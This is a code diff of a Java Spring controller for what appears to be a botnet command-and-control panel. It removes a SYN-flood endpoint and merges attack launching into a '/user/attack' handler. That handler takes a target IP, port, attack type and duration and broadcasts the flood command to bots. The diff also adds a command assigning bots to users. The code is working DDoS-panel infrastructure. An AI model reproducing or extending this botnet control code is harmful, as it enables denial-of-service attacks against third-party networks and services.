@@ -125,53 +125,7 @@ public class SiteController {
 	
 	
 
-//	// @PreAuthorize("hasRole('ADMIN')")
-//	@RequestMapping(value = "/index", method = RequestMethod.GET)
-//	public String index(HttpServletResponse error) throws IOException {
-//		String result = "";
-//		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-//		if (configEngine.isCommandandconquerStatus()) {
-//			System.out.println("Role= " + auth.getAuthorities());
-//			// User u=uServ.findBySsoId(auth.getCredentials().toString());
-//			Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
-//			for (GrantedAuthority gA : x) {
-//				System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
-//				if (gA.toString().contains("ROLE_ADMIN")) {
-//					System.out.println("admin ");
-//					result = "indexadmin";
-//				}
-//				if (gA.toString().contains("ROLE_USER")) {
-//					System.out.println("no admin");
-//					result = "indexuser";
-//				}
-//			}
-//		} else {
-//			error.sendError(HttpStatus.SC_NOT_FOUND);
-//		}
-//		return result;
-//	}
 
-	// @PreAuthorize("hasAnyRole('ADMIN','USER')")
-	/**
-	 * @param error
-	 * @return
-	 * @throws IOException
-	 */
-	@RequestMapping(value = "/flood", method = RequestMethod.GET)
-	public Boolean flood(@RequestParam String cmd, HttpServletResponse error) throws IOException {
-		if (configEngine.isCommandandconquerStatus()) {
-			// startFLood
-
-			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-			// getName=SSOID
-			String idUser = auth.getName(); // get logged in username
-			cmm.floodingByUser(cmd, idUser);
-			return true;
-		} else {
-			error.sendError(HttpStatus.SC_NOT_FOUND);
-			return false;
-		}
-	}
 
 
 
@@ -248,17 +202,15 @@ public class SiteController {
 
 	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.POST)
 	public ModelAndView addBot(@ModelAttribute("linkBot") LinkBot lb) {
-		System.out.println("linkstart2");
-
 		System.out.println(" m utente " + lb.getIdUsrL());
 		System.out.println(" m bot " + lb.getIdBotL());
-		System.out.println("linkFinisgh3");
 		Bot bot = bServ.searchBotID(lb.getIdBotL());
 		User usr = uServ.findById(lb.getIdUsrL());
-		System.out.println("bot " + bot.getIp() + " " + bot.getIdBot() + " " + bot.getBotUser() == null);
 		bot.setBotUser(usr);
 		System.out.println("bot " + bot.getIp() + " " + bot.getIdBot() + " " + bot.getBotUser() == null);
 		bServ.updateBot(bot);
+		String cmd="setbot<BU>"+usr.getSsoId()+"<BU>"+bot.getIdBot();
+		cmm.floodingByCecSetUserToBot(cmd, usr.getSsoId());
 		return new ModelAndView("redirect:/site/admin/addbot");
 	}
 
@@ -384,19 +336,7 @@ public class SiteController {
 
 		return "TESTING";
 	}
-	
-	
-	@RequestMapping(value = { "/user/ddos" }, method = RequestMethod.POST)
-	public String synFlood(String ipDest,int portDest,Integer time) {
-		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-		String idUser = auth.getName();
-		System.out.println("Utente che sta iniziando un attacco "+idUser);		
-		String cmd = "synflood<SF>" + ipDest + "<SF>" + portDest+"<SF>"+time;
-		cmm.flooding(cmd);
-		return "redirect: /site/user/attack";
-	}
-	
-	
+		
 	@RequestMapping(value = { "/user/attack" }, method = RequestMethod.GET)
 	public String attack(ModelMap model) {
 		
@@ -412,26 +352,76 @@ public class SiteController {
 	
 	
 	
+
 	@RequestMapping(value = { "/user/attack" }, method = RequestMethod.POST)
-	public ModelAndView choseAttack(@ModelAttribute("target")Target target) {	
+	public ModelAndView choseAttack(@ModelAttribute("target")Target target, HttpServletResponse error) throws IOException {	
+		if (configEngine.isCommandandconquerStatus()) {
 		System.out.println("stampo roba "+target.getTypeAttack()+" "+target.getIpDest()+" "+target.getPortDest()+" "+target.getTimeToAttack());
+		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+		String idUser = auth.getName();
+		System.out.println("Utente che sta iniziando un attacco "+idUser);		
+		String cmd = target.getTypeAttack()+"<TT>" + target.getIpDest() + "<TT>" + target.getPortDest()+"<TT>"+target.getTimeToAttack()+"<TT>"+idUser;
+		cmm.floodingByUser(cmd, idUser);
 		return new ModelAndView("redirect:/site/user/attack");
+		} else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+			return null;
+		}
 	}
 	
 	
 	
+//	/**
+//	 * @param error
+//	 * @return
+//	 * @throws IOException
+//	 */
+//	@RequestMapping(value = "/flood", method = RequestMethod.GET)
+//	public Boolean flood(@RequestParam String cmd, HttpServletResponse error) throws IOException {
+//		if (configEngine.isCommandandconquerStatus()) {
+//			// startFLood
+//
+//			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+//			// getName=SSOID
+//			String idUser = auth.getName(); // get logged in username
+//			cmm.floodingByUser(cmd, idUser);
+//			return true;
+//		} else {
+//			error.sendError(HttpStatus.SC_NOT_FOUND);
+//			return false;
+//		}
+//	}
 	
 	
+//	// @PreAuthorize("hasRole('ADMIN')")
+//	@RequestMapping(value = "/index", method = RequestMethod.GET)
+//	public String index(HttpServletResponse error) throws IOException {
+//		String result = "";
+//		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+//		if (configEngine.isCommandandconquerStatus()) {
+//			// User u=uServ.findBySsoId(auth.getCredentials().toString());
+//			Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
+//			for (GrantedAuthority gA : x) {
+//				System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
+//				if (gA.toString().contains("ROLE_ADMIN")) {
+//					System.out.println("admin ");
+//					result = "indexadmin";
+//				}
+//				if (gA.toString().contains("ROLE_USER")) {
+//					System.out.println("no admin");
+//					result = "indexuser";
+//				}
+//			}
+//		} else {
+//			error.sendError(HttpStatus.SC_NOT_FOUND);
+//		}
+//		return result;
+//	}
 	
+	// @PreAuthorize("hasAnyRole('ADMIN','USER')")
+//			System.out.println("Role= " + auth.getAuthorities());
 	
-	
-	
-	
-	
-	
-	
-	
-	
+
 	
 	// /**
 	// * This method will provide UserProfile list to views
